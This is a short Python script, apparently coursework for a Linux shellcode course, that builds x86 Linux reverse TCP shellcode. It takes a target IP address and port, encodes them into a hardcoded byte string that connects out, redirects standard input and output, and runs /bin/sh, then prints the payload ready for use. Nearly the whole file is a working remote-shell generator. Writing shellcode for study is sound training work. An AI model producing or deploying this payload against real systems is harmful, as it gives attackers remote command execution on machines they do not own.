# Paolo Stagno aka [VoidSec](https://voidsec.com)
# SLAE-1511
#!/usr/bin/env python

import sys;
if (len(sys.argv) != 3):
	print ("usage: " + sys.argv[0] + " ip port");
	sys.exit(-1)
else:	
	ip = sys.argv[1]
	hip = "\\x"+"\\x".join([hex(int(x)+256)[3:] for x in ip.split('.')])
	port = int(sys.argv[2])
	if port < 0 or port > 65535:
		print "[!] Invalid TCP port number {}, must be between 0-65535".format(port)
		sys.exit(-1)
	
# convert to hex and strip 0x
hport=hex(port).strip("0x")
# add an \\x every 2 chars
hport="\\x"+"\\x".join(a+b for a,b in zip(hport[::2],hport[1::2]))

shellcode="\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{}\\x68\\x02\\x00{}\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(hip,hport)

print "Reverse TCP shellcode connecting to {}:{} - {}:{}".format(ip,port,hip,hport)
print "\n"+shellcode
